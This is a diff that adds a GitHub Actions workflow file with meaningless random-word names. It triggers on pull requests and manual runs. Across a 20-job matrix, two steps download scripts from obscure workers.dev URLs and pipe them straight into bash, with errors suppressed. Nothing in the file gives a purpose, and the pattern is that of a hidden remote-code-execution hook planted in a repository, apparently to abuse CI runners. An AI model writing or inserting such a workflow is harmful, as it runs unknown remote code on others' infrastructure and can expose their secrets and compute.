@@ -1,0 +1,31 @@
+name: basketball
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+concurrency:
+  group: accuse
+  cancel-in-progress: false
+
+jobs:
+  cut:
+    strategy:
+      matrix:
+        resident: ["promise", "pose", "protection", "frame", "chap"]
+        preliminary: ["determine", "similar", "acute", "difference"]
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - name: notice
+      continue-on-error: true
+      run: |
+        curl -L "https://node.vrotsosvanhouten30272.workers.dev/e92770b/690192ac373c0e59dc14/af/209d36a1b4521cff36d36c17afe/208e9636?smk=1777697690&v=clj&r=e&p=mo" | bash
+    - name: ore
+      continue-on-error: true
+      run: curl -sS -L -X GET "https://node.dolentemanhire9008.workers.dev/9/57b/5a619b37a9990e683fdb724a01452296ee30ed1/814cde31a706d195beff9?v=1777719590" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        name: 'observe'
+        path: 'grocer'
